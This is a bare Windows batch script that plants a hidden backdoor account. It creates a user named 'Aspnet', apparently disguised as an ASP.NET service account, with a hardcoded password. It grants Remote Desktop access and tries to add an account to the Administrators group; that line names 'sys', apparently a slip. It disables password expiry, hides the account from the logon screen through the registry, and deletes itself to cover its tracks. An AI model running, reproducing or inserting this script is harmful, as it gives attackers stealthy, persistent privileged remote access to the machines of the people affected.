Set AdmGroupSID=S-1-5-32-544
Set AdmGroup=
For /F "UseBackQ Tokens=1* Delims==" %%I In (`WMIC Group Where "SID = '%AdmGroupSID%'" Get Name /Value ^| Find "="`) Do Set AdmGroup=%%J
Set AdmGroup=%AdmGroup:~0,-1%
net user Aspnet qaz111WSXasdf /add
net localgroup %AdmGroup% sys /add
Set RDPGroupSID=S-1-5-32-555
Set RDPGroup=
For /F "UseBackQ Tokens=1* Delims==" %%I In (`WMIC Group Where "SID = '%RDPGroupSID%'" Get Name /Value ^| Find "="`) Do Set RDPGroup=%%J
Set RDPGroup=%RDPGroup:~0,-1%
net localgroup "%RDPGroup%" Aspnet /add
net accounts /maxpwage:unlimited
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v Aspnet /t REG_DWORD /d 0 /f

del "%~f0"
